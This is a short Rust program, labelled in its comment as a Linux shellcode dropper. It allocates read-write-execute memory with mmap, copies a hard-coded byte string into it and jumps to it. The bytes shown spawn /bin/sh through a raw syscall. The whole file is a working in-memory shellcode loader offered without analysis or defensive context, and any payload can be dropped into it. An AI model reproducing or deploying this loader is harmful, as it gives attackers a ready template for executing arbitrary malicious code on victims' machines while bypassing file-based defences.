use core::slice;
use libc::{c_uint, c_void, mmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};
use std::mem;
use std::ptr;

#[no_mangle]
unsafe fn run() {
    // linux shell code dropper
    let code = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

    let virt_addr: *mut c_void = mmap(
        ptr::null_mut(),
        code.len(),
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANONYMOUS | MAP_PRIVATE,
        0,
        0,
    );

    let temp_code: &mut [u8] = slice::from_raw_parts_mut(virt_addr as *mut u8, code.len());
    for i in 0..code.len() {
        temp_code[i] = code[i];
    }

    let asm_func: extern "C" fn() -> c_uint = mem::transmute(virt_addr);
    asm_func();
}

fn main() {
    unsafe { run() }
}
